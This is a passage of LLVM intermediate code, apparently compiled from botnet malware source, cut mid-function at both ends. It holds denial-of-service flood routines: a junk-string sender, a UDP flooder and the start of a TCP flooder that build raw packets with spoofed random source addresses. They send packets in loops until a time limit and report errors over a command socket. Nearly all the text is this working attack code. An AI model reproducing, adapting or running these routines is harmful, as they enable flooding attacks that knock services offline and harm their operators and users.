  %12 = alloca [36 x i8*], align 16
  %13 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = call i32 @socket(i32 2, i32 2, i32 0) #5
  store i32 %14, i32* %7, align 4
  %15 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %16 = sext i32 %15 to i64
  store i64 %16, i64* %8, align 8
  %17 = load i8*, i8** %4, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %10, align 8
  %19 = bitcast %struct.sockaddr_in* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 16, i32 4, i1 false)
  %20 = load %struct.hostent*, %struct.hostent** %10, align 8
  %21 = getelementptr inbounds %struct.hostent, %struct.hostent* %20, i32 0, i32 4
  %22 = load i8**, i8*** %21, align 8
  %23 = getelementptr inbounds i8*, i8** %22, i64 0
  %24 = load i8*, i8** %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %26 = bitcast %struct.in_addr* %25 to i8*
  %27 = load %struct.hostent*, %struct.hostent** %10, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 3
  %29 = load i32, i32* %28, align 4
  %30 = sext i32 %29 to i64
  call void @bcopy(i8* %24, i8* %26, i64 %30) #5
  %31 = load %struct.hostent*, %struct.hostent** %10, align 8
  %32 = getelementptr inbounds %struct.hostent, %struct.hostent* %31, i32 0, i32 2
  %33 = load i32, i32* %32, align 8
  %34 = trunc i32 %33 to i16
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 %34, i16* %35, align 4
  %36 = load i32, i32* %5, align 4
  %37 = trunc i32 %36 to i16
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  store i32 0, i32* %11, align 4
  br label %39

; <label>:39:                                     ; preds = %66, %3
  %40 = bitcast [36 x i8*]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %41 = call i32 @rand() #5
  %42 = sext i32 %41 to i64
  %43 = urem i64 %42, 36
  %44 = getelementptr inbounds [36 x i8*], [36 x i8*]* %12, i64 0, i64 %43
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i32, i32* %11, align 4
  %47 = icmp uge i32 %46, 50
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %39
  %49 = load i32, i32* %7, align 4
  %50 = load i8*, i8** %13, align 8
  %51 = call i64 @send(i32 %49, i8* %50, i64 75, i32 0)
  %52 = load i32, i32* %7, align 4
  %53 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %54 = call i32 @connect(i32 %52, %struct.sockaddr* %53, i32 16)
  %55 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %56 = sext i32 %55 to i64
  %57 = load i64, i64* %8, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = add nsw i64 %57, %59
  %61 = icmp sge i64 %56, %60
  br i1 %61, label %62, label %65

; <label>:62:                                     ; preds = %48
  %63 = load i32, i32* %7, align 4
  %64 = call i32 @close(i32 %63)
  call void @_exit(i32 0) #12
  unreachable

; <label>:65:                                     ; preds = %48
  store i32 0, i32* %11, align 4
  br label %66

; <label>:66:                                     ; preds = %65, %39
  %67 = load i32, i32* %11, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %11, align 4
  br label %39
                                                  ; No predecessors!
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.sockaddr_in, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  store i8* %0, i8** %7, align 8
  store i32 %1, i32* %8, align 4
  store i32 %2, i32* %9, align 4
  store i32 %3, i32* %10, align 4
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 0
  store i16 2, i16* %28, align 4
  %29 = load i32, i32* %8, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

; <label>:31:                                     ; preds = %6
  %32 = call i32 @rand_cmwc()
  %33 = trunc i32 %32 to i16
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %33, i16* %34, align 2
  br label %40

; <label>:35:                                     ; preds = %6
  %36 = load i32, i32* %8, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #13
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  br label %40

; <label>:40:                                     ; preds = %35, %31
  %41 = load i8*, i8** %7, align 8
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %43 = call i32 @getHost(i8* %41, %struct.in_addr* %42)
  %44 = icmp ne i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %40
  br label %269

; <label>:46:                                     ; preds = %40
  %47 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 3
  %48 = getelementptr inbounds [8 x i8], [8 x i8]* %47, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %48, i8 0, i64 8, i32 4, i1 false)
  %49 = load i32, i32* %12, align 4
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %10, align 4
  %51 = icmp eq i32 %50, 32
  br i1 %51, label %52, label %104

; <label>:52:                                     ; preds = %46
  %53 = call i32 @socket(i32 2, i32 2, i32 17) #5
  store i32 %53, i32* %15, align 4
  %54 = load i32, i32* %15, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %59, label %56

; <label>:56:                                     ; preds = %52
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  br label %269

; <label>:59:                                     ; preds = %52
  %60 = load i32, i32* %11, align 4
  %61 = add nsw i32 %60, 1
  %62 = sext i32 %61 to i64
  %63 = call noalias i8* @malloc(i64 %62) #5
  store i8* %63, i8** %16, align 8
  %64 = load i8*, i8** %16, align 8
  %65 = icmp eq i8* %64, null
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %59
  br label %269

; <label>:67:                                     ; preds = %59
  %68 = load i8*, i8** %16, align 8
  %69 = load i32, i32* %11, align 4
  %70 = add nsw i32 %69, 1
  %71 = sext i32 %70 to i64
  call void @llvm.memset.p0i8.i64(i8* %68, i8 0, i64 %71, i32 1, i1 false)
  %72 = load i8*, i8** %16, align 8
  %73 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %72, i32 %73)
  %74 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %74, %75
  store i32 %76, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %77

; <label>:77:                                     ; preds = %100, %99, %67
  %78 = load i32, i32* %15, align 4
  %79 = load i8*, i8** %16, align 8
  %80 = load i32, i32* %11, align 4
  %81 = sext i32 %80 to i64
  %82 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %83 = call i64 @sendto(i32 %78, i8* %79, i64 %81, i32 0, %struct.sockaddr* %82, i32 16)
  %84 = load i32, i32* %18, align 4
  %85 = load i32, i32* %14, align 4
  %86 = icmp eq i32 %84, %85
  br i1 %86, label %87, label %100

; <label>:87:                                     ; preds = %77
  %88 = load i32, i32* %8, align 4
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %87
  %91 = call i32 @rand_cmwc()
  %92 = trunc i32 %91 to i16
  %93 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %92, i16* %93, align 2
  br label %94

; <label>:94:                                     ; preds = %90, %87
  %95 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %96 = load i32, i32* %17, align 4
  %97 = icmp sgt i32 %95, %96
  br i1 %97, label %98, label %99

; <label>:98:                                     ; preds = %94
  br label %103

; <label>:99:                                     ; preds = %94
  store i32 0, i32* %18, align 4
  br label %77

; <label>:100:                                    ; preds = %77
  %101 = load i32, i32* %18, align 4
  %102 = add i32 %101, 1
  store i32 %102, i32* %18, align 4
  br label %77

; <label>:103:                                    ; preds = %98
  br label %269

; <label>:104:                                    ; preds = %46
  %105 = call i32 @socket(i32 2, i32 3, i32 17) #5
  store i32 %105, i32* %19, align 4
  %106 = load i32, i32* %19, align 4
  %107 = icmp ne i32 %106, 0
  br i1 %107, label %111, label %108

; <label>:108:                                    ; preds = %104
  %109 = load i32, i32* @mainCommSock, align 4
  %110 = call i32 (i32, i8*, ...) @sockprintf(i32 %109, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  br label %269

; <label>:111:                                    ; preds = %104
  store i32 1, i32* %20, align 4
  %112 = load i32, i32* %19, align 4
  %113 = bitcast i32* %20 to i8*
  %114 = call i32 @setsockopt(i32 %112, i32 0, i32 3, i8* %113, i32 4) #5
  %115 = icmp slt i32 %114, 0
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 (i32, i8*, ...) @sockprintf(i32 %117, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i32 0, i32 0))
  br label %269

; <label>:119:                                    ; preds = %111
  store i32 50, i32* %21, align 4
  br label %120

; <label>:120:                                    ; preds = %124, %119
  %121 = load i32, i32* %21, align 4
  %122 = add nsw i32 %121, -1
  store i32 %122, i32* %21, align 4
  %123 = icmp ne i32 %121, 0
  br i1 %123, label %124, label %129

; <label>:124:                                    ; preds = %120
  %125 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %126 = call i32 @rand_cmwc()
  %127 = xor i32 %125, %126
  call void @srand(i32 %127) #5
  %128 = call i32 @rand() #5
  call void @init_rand(i32 %128)
  br label %120

; <label>:129:                                    ; preds = %120
  %130 = load i32, i32* %10, align 4
  %131 = icmp eq i32 %130, 0
  br i1 %131, label %132, label %133

; <label>:132:                                    ; preds = %129
  store i32 0, i32* %22, align 4
  br label %139

; <label>:133:                                    ; preds = %129
  %134 = load i32, i32* %10, align 4
  %135 = sub nsw i32 32, %134
  %136 = shl i32 1, %135
  %137 = sub nsw i32 %136, 1
  %138 = xor i32 %137, -1
  store i32 %138, i32* %22, align 4
  br label %139

; <label>:139:                                    ; preds = %133, %132
  %140 = load i32, i32* %11, align 4
  %141 = sext i32 %140 to i64
  %142 = add i64 28, %141
  %143 = call i8* @llvm.stacksave()
  store i8* %143, i8** %23, align 8
  %144 = alloca i8, i64 %142, align 16
  %145 = bitcast i8* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %24, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %147 = bitcast %struct.iphdr* %146 to i8*
  %148 = getelementptr i8, i8* %147, i64 20
  %149 = bitcast i8* %148 to %struct.udphdr*
  store %struct.udphdr* %149, %struct.udphdr** %25, align 8
  %150 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %152 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %151, i32 0, i32 0
  %153 = load i32, i32* %152, align 4
  %154 = load i32, i32* %22, align 4
  %155 = call i32 @getRandomIP(i32 %154)
  %156 = call i32 @htonl(i32 %155) #13
  %157 = load i32, i32* %11, align 4
  %158 = sext i32 %157 to i64
  %159 = add i64 8, %158
  %160 = trunc i64 %159 to i32
  call void @makeIPPacket(%struct.iphdr* %150, i32 %153, i32 %156, i8 zeroext 17, i32 %160)
  %161 = load i32, i32* %11, align 4
  %162 = sext i32 %161 to i64
  %163 = add i64 8, %162
  %164 = trunc i64 %163 to i16
  %165 = call zeroext i16 @htons(i16 zeroext %164) #13
  %166 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon.2* %167 to %struct.anon.3*
  %169 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %168, i32 0, i32 2
  store i16 %165, i16* %169, align 2
  %170 = call i32 @rand_cmwc()
  %171 = trunc i32 %170 to i16
  %172 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %173 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %172, i32 0, i32 0
  %174 = bitcast %union.anon.2* %173 to %struct.anon.3*
  %175 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %174, i32 0, i32 0
  store i16 %171, i16* %175, align 2
  %176 = load i32, i32* %8, align 4
  %177 = icmp eq i32 %176, 0
  br i1 %177, label %178, label %180

; <label>:178:                                    ; preds = %139
  %179 = call i32 @rand_cmwc()
  br label %185

; <label>:180:                                    ; preds = %139
  %181 = load i32, i32* %8, align 4
  %182 = trunc i32 %181 to i16
  %183 = call zeroext i16 @htons(i16 zeroext %182) #13
  %184 = zext i16 %183 to i32
  br label %185

; <label>:185:                                    ; preds = %180, %178
  %186 = phi i32 [ %179, %178 ], [ %184, %180 ]
  %187 = trunc i32 %186 to i16
  %188 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 0
  %190 = bitcast %union.anon.2* %189 to %struct.anon.3*
  %191 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %190, i32 0, i32 1
  store i16 %187, i16* %191, align 2
  %192 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %193 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %192, i32 0, i32 0
  %194 = bitcast %union.anon.2* %193 to %struct.anon.3*
  %195 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %194, i32 0, i32 3
  store i16 0, i16* %195, align 2
  %196 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %197 = bitcast %struct.udphdr* %196 to i8*
  %198 = getelementptr inbounds i8, i8* %197, i64 8
  %199 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %198, i32 %199)
  %200 = bitcast i8* %144 to i16*
  %201 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 2
  %203 = load i16, i16* %202, align 2
  %204 = zext i16 %203 to i32
  %205 = call zeroext i16 @csum(i16* %200, i32 %204)
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i32 0, i32 7
  store i16 %205, i16* %207, align 2
  %208 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %209 = load i32, i32* %9, align 4
  %210 = add nsw i32 %208, %209
  store i32 %210, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %211

; <label>:211:                                    ; preds = %264, %263, %185
  br label %212

; <label>:212:                                    ; preds = %211
  %213 = load i32, i32* %19, align 4
  %214 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %215 = call i64 @sendto(i32 %213, i8* %144, i64 %142, i32 0, %struct.sockaddr* %214, i32 16)
  %216 = call i32 @rand_cmwc()
  %217 = trunc i32 %216 to i16
  %218 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %219 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %218, i32 0, i32 0
  %220 = bitcast %union.anon.2* %219 to %struct.anon.3*
  %221 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %220, i32 0, i32 0
  store i16 %217, i16* %221, align 2
  %222 = load i32, i32* %8, align 4
  %223 = icmp eq i32 %222, 0
  br i1 %223, label %224, label %226

; <label>:224:                                    ; preds = %212
  %225 = call i32 @rand_cmwc()
  br label %231

; <label>:226:                                    ; preds = %212
  %227 = load i32, i32* %8, align 4
  %228 = trunc i32 %227 to i16
  %229 = call zeroext i16 @htons(i16 zeroext %228) #13
  %230 = zext i16 %229 to i32
  br label %231

; <label>:231:                                    ; preds = %226, %224
  %232 = phi i32 [ %225, %224 ], [ %230, %226 ]
  %233 = trunc i32 %232 to i16
  %234 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %235 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %234, i32 0, i32 0
  %236 = bitcast %union.anon.2* %235 to %struct.anon.3*
  %237 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %236, i32 0, i32 1
  store i16 %233, i16* %237, align 2
  %238 = call i32 @rand_cmwc()
  %239 = trunc i32 %238 to i16
  %240 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 3
  store i16 %239, i16* %241, align 4
  %242 = load i32, i32* %22, align 4
  %243 = call i32 @getRandomIP(i32 %242)
  %244 = call i32 @htonl(i32 %243) #13
  %245 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 8
  store i32 %244, i32* %246, align 4
  %247 = bitcast i8* %144 to i16*
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 2
  %250 = load i16, i16* %249, align 2
  %251 = zext i16 %250 to i32
  %252 = call zeroext i16 @csum(i16* %247, i32 %251)
  %253 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %254 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %253, i32 0, i32 7
  store i16 %252, i16* %254, align 2
  %255 = load i32, i32* %27, align 4
  %256 = load i32, i32* %14, align 4
  %257 = icmp eq i32 %255, %256
  br i1 %257, label %258, label %264

; <label>:258:                                    ; preds = %231
  %259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %260 = load i32, i32* %26, align 4
  %261 = icmp sgt i32 %259, %260
  br i1 %261, label %262, label %263

; <label>:262:                                    ; preds = %258
  br label %267

; <label>:263:                                    ; preds = %258
  store i32 0, i32* %27, align 4
  br label %211

; <label>:264:                                    ; preds = %231
  %265 = load i32, i32* %27, align 4
  %266 = add i32 %265, 1
  store i32 %266, i32* %27, align 4
  br label %211

; <label>:267:                                    ; preds = %262
  %268 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %268)
  br label %269

; <label>:269:                                    ; preds = %267, %116, %108, %103, %66, %56, %45
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %339

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #5
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %54, label %51

; <label>:51:                                     ; preds = %45
  %52 = load i32, i32* @mainCommSock, align 4
  %53 = call i32 (i32, i8*, ...) @sockprintf(i32 %52, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.414, i32 0, i32 0))
  br label %339

; <label>:54:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %55 = load i32, i32* %17, align 4
  %56 = bitcast i32* %18 to i8*
  %57 = call i32 @setsockopt(i32 %55, i32 0, i32 3, i8* %56, i32 4) #5
  %58 = icmp slt i32 %57, 0
  br i1 %58, label %59, label %62

; <label>:59:                                     ; preds = %54
  %60 = load i32, i32* @mainCommSock, align 4
  %61 = call i32 (i32, i8*, ...) @sockprintf(i32 %60, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.415, i32 0, i32 0))
  br label %339

; <label>:62:                                     ; preds = %54
  %63 = load i32, i32* %11, align 4
  %64 = icmp eq i32 %63, 0
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %62
  store i32 0, i32* %19, align 4
  br label %72

; <label>:66:                                     ; preds = %62
  %67 = load i32, i32* %11, align 4
  %68 = sub nsw i32 32, %67
  %69 = shl i32 1, %68
  %70 = sub nsw i32 %69, 1
  %71 = xor i32 %70, -1
  store i32 %71, i32* %19, align 4
  br label %72

; <label>:72:                                     ; preds = %66, %65
  %73 = load i32, i32* %13, align 4
  %74 = sext i32 %73 to i64
  %75 = add i64 40, %74
  %76 = call i8* @llvm.stacksave()
  store i8* %76, i8** %20, align 8
  %77 = alloca i8, i64 %75, align 16
  %78 = bitcast i8* %77 to %struct.iphdr*
  store %struct.iphdr* %78, %struct.iphdr** %21, align 8
  %79 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %80 = bitcast %struct.iphdr* %79 to i8*
  %81 = getelementptr i8, i8* %80, i64 20
  %82 = bitcast i8* %81 to %struct.tcphdr*
  store %struct.tcphdr* %82, %struct.tcphdr** %22, align 8
  %83 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %84 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %85 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %84, i32 0, i32 0
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* %19, align 4
  %88 = call i32 @getRandomIP(i32 %87)
  %89 = call i32 @htonl(i32 %88) #13
  %90 = load i32, i32* %13, align 4
  %91 = sext i32 %90 to i64
  %92 = add i64 20, %91
  %93 = trunc i64 %92 to i32
  call void @makeIPPacket(%struct.iphdr* %83, i32 %86, i32 %89, i8 zeroext 6, i32 %93)
  %94 = call i32 @rand_cmwc()
  %95 = trunc i32 %94 to i16
  %96 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %97 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %96, i32 0, i32 0
  %98 = bitcast %union.anon.0* %97 to %struct.anon.1*
  %99 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %98, i32 0, i32 0
  store i16 %95, i16* %99, align 4
  %100 = call i32 @rand_cmwc()
  %101 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %102 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %101, i32 0, i32 0
  %103 = bitcast %union.anon.0* %102 to %struct.anon.1*
  %104 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %103, i32 0, i32 2
  store i32 %100, i32* %104, align 4
  %105 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %105, i32 0, i32 0
  %107 = bitcast %union.anon.0* %106 to %struct.anon.1*
  %108 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %107, i32 0, i32 3
  store i32 0, i32* %108, align 4
  %109 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %110 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %109, i32 0, i32 0
  %111 = bitcast %union.anon.0* %110 to %struct.anon.1*
  %112 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %111, i32 0, i32 4
  %113 = load i16, i16* %112, align 4
  %114 = and i16 %113, -241
  %115 = or i16 %114, 80
  store i16 %115, i16* %112, align 4
  %116 = load i8*, i8** %12, align 8
  %117 = call i32 @strcmp(i8* %116, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.416, i32 0, i32 0)) #10
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %155, label %119

; <label>:119:                                    ; preds = %72
  %120 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %121 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %120, i32 0, i32 0
  %122 = bitcast %union.anon.0* %121 to %struct.anon.1*
  %123 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %122, i32 0, i32 4
  %124 = load i16, i16* %123, align 4
  %125 = and i16 %124, -513
  %126 = or i16 %125, 512
  store i16 %126, i16* %123, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = and i16 %131, -1025
  %133 = or i16 %132, 1024
  store i16 %133, i16* %130, align 4
  %134 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %135 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %134, i32 0, i32 0
  %136 = bitcast %union.anon.0* %135 to %struct.anon.1*
  %137 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %136, i32 0, i32 4
  %138 = load i16, i16* %137, align 4
  %139 = and i16 %138, -257
  %140 = or i16 %139, 256
  store i16 %140, i16* %137, align 4
  %141 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %142 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.0* %142 to %struct.anon.1*
  %144 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %143, i32 0, i32 4
  %145 = load i16, i16* %144, align 4
  %146 = and i16 %145, -4097
  %147 = or i16 %146, 4096
  store i16 %147, i16* %144, align 4
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = and i16 %152, -2049
  %154 = or i16 %153, 2048
  store i16 %154, i16* %151, align 4
  br label %232

; <label>:155:                                    ; preds = %72
  %156 = load i8*, i8** %12, align 8
  %157 = call i8* @strtok(i8* %156, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.417, i32 0, i32 0)) #5
  store i8* %157, i8** %23, align 8
  br label %158

; <label>:158:                                    ; preds = %229, %155
